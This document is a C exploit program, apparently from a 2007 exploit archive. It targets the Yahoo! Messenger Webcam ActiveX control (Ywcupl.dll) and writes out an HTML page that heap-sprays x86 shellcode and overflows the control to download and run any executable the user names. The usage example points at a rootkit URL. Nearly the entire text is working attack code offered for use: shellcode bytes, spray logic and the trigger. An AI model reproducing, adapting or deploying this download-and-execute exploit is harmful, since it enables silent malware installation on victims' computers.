<html><head><title>Yahoo! Messenger Webcam 8.1 (Ywcupl.dll) Download / Execute Exploit</title></head><pre>/* 
  Compile in LCC-win32 (Free!)
  Download and exec any file you like!
  Have Fun!
  */ 

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
char *file = &quot;Click_here.html&quot;;
FILE *fp = NULL;
   
unsigned char sc[] =
&quot;\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03&quot;
&quot;\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74&quot;
&quot;\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E&quot;
&quot;\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03&quot;
&quot;\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C&quot;
&quot;\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40&quot;
&quot;\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C&quot;
&quot;\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC&quot;
&quot;\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F&quot;
&quot;\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB&quot;
&quot;\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83&quot;
&quot;\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF&quot;
&quot;\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF&quot;;
   
  
char *url = NULL;
unsigned char sc_2[] = &quot;\x00\x98&quot;;
  
char * header =
&quot;&lt;html&gt;\n&quot;
&quot;&lt;object classid=\&quot;clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277\&quot; id='viewme'&gt;&lt;/object&gt;\n&quot;
&quot;&lt;body&gt;\n&quot;
&quot;&lt;SCRIPT language=\&quot;javascript\&quot;&gt;\n&quot;
&quot;var shellcode = unescape(\&quot;%u9090%u9090%u9090%u9090\&quot; + \n&quot;;
  char * footer =
&quot;\n\n&quot;
&quot;bigblock = unescape(\&quot;%u9090%u9090\&quot;);\n&quot;
&quot;headersize = 20;\n&quot;
&quot;slackspace = headersize+shellcode.length;\n&quot;
&quot;while (bigblock.length&lt;slackspace) bigblock+=bigblock;\n&quot;
&quot;fillblock = bigblock.substring(0, slackspace);\n&quot;
&quot;block = bigblock.substring(0, bigblock.length-slackspace);\n&quot;
&quot;while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;\n&quot;
&quot;memory = new Array();\n&quot;
&quot;for (x=0; x&lt;500; x++) memory[x] = block + shellcode;\n&quot;
&quot;var buffer = '\\x0a';\n&quot;
&quot;while (buffer.length &lt; 5000) buffer+='\\x0a\\x0a\\x0a\\x0a';\n&quot;
&quot;viewme.server = buffer;\n&quot;
&quot;viewme.initialize();\n&quot;
&quot;viewme.send();\n&quot;;
  
char * trigger_1 =
&quot;&lt;/script&gt;\n&quot;
&quot;&lt;/body&gt;\n&quot;
&quot;&lt;/html&gt;\n&quot;;
  
// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
int i;
for(i=0;i&lt;buffsize;i+=2)
{
if((i%16)==0)
{
if(i!=0)
{
printf(&quot;\&quot;\n\&quot;&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot; +\n\&quot;&quot;);
}
else
{
printf(&quot;\&quot;&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot;&quot;);
}
}
  printf(&quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);
  fprintf(fp, &quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);
}
  printf(&quot;\&quot;;\n&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot;);\n&quot;);
  
fflush(fp);
}
   
  
void main(int argc, char **argv)
{
unsigned char buf[1024] = {0};
  int sc_len = 0;
int n;
  
if (argc &lt; 2)
{
 printf(&quot;\r\nYahoo 0day Ywcupl.dll ActiveX Exploit Download And Exec\n&quot;);
 printf(&quot;link:http://research.eeye.com/html/advisories/upcoming/20070605.html\n&quot;);
 printf(&quot;link:http://www.informationweek.com/news/showArticle.jhtml?articleID=199901856 \n&quot;);
 printf(&quot;link:http://secunia.com/advisories/25547/\n&quot;);
 printf(&quot;greetz to Jambalaya for helping with this code\n&quot;);
 printf(&quot;\r\nUsage: %s &lt;URL&gt; [htmlfile]\n&quot;, argv[0]);
 printf(&quot;\r\nE.g.: %s http://www.malwarehere.com/rootkit.exe exploit.html\r\n\n&quot;, argv[0]);
 printf(&quot;=-Excepti0n-=\n&quot;);
exit(1);
}
  url = argv[1];
  
if( (!strstr(url, &quot;http://&quot;) &amp;&amp; !strstr(url, &quot;ftp://&quot;)) || strlen(url) &lt; 10)
{
printf(&quot;[-] Invalid url. Must start with 'http://','ftp://'\n&quot;);
return;
}
  printf(&quot;[+] download url:%s\n&quot;, url);
  if(argc &gt;=3) file = argv[2];
printf(&quot;[+] exploit file:%s\n&quot;, file);
  fp = fopen(file, &quot;w&quot;);
if(!fp)
{
printf(&quot;[-] Open file error!\n&quot;);
return;
}
  
//build Exploit HTML File
fprintf(fp, &quot;%s&quot;, header);
fflush(fp);
  memset(buf, 0, sizeof(buf));
sc_len = sizeof(sc)-1;
memcpy(buf, sc, sc_len);
memcpy(buf+sc_len, url, strlen(url));
  sc_len += strlen(url);
  memcpy(buf+sc_len, sc_2, 1);
sc_len += 1;
  PrintPayLoad((char *)buf, sc_len);
  fprintf(fp, &quot;%s&quot;, footer);
fflush(fp);
  fprintf(fp, &quot;%s&quot;, trigger_1);
fflush(fp);
  
printf(&quot;[+] exploit write to %s success!\n&quot;, file);
}

// =-Excepti0n-= 

// milw0rm.com [2007-06-08]</pre></html>